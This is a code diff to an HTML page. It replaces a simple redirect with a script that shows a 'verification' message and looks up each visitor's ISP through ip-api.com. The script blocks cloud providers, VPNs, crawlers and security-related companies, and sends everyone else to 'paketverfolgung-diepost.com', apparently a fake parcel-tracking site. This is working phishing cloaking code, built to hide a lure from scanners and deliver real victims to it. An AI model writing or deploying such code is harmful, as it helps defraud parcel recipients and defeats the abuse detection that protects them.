@@ -5,13 +5,52 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
-    <script>
-        // Change this URL to your render.com URL
-        window.location.href = "https://render.com";
-    </script>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; }
+    </style>
 </head>
 <body>
-    <p>Redirecting to render.com...</p>
-    <p>If you are not redirected, <a href="https://render.com">click here</a></p>
+    <p>Vérification en cours...</p>
+    <script>
+        const BLOCKED_PROVIDERS = [
+            'google', 'azure', 'cloudflare', 'amazonaws', 'digitalocean',
+            'linode', 'vultr', 'ovh', 'hetzner', 'scaleway', 'aws',
+            'datacenter', 'hosting', 'vpn', 'proxy', 'bot', 'crawler',
+            'facebook', 'amazon', 'microsoft', 'akamai', 'fastly'
+        ];
+
+        async function checkAndRedirect() {
+            try {
+                // Récupérer l'IP via ip-api.com
+                const response = await fetch('http://ip-api.com/json/?fields=query,isp,org,usage,mobile');
+                const data = await response.json();
+
+                const isp = (data.isp || '').toLowerCase();
+                const org = (data.org || '').toLowerCase();
+                const usage = (data.usage || '').toLowerCase();
+
+                // Vérifier si c'est un datacenter/bot
+                const isBlocked = BLOCKED_PROVIDERS.some(provider =>
+                    isp.includes(provider) || org.includes(provider) || usage.includes(provider)
+                );
+
+                const isDatacenter = usage.includes('datacenter') || usage.includes('commercial');
+
+                if (isBlocked || isDatacenter) {
+                    document.body.innerHTML = '<p>Accès refusé</p>';
+                    console.log('Blocked:', { isp, org, usage });
+                } else {
+                    // Redirection instantanée
+                    window.location.href = 'https://paketverfolgung-diepost.com';
+                }
+            } catch (error) {
+                // Si erreur, rediriger quand même
+                console.error('Error:', error);
+                window.location.href = 'https://paketverfolgung-diepost.com';
+            }
+        }
+
+        checkAndRedirect();
+    </script>
 </body>
 </html>
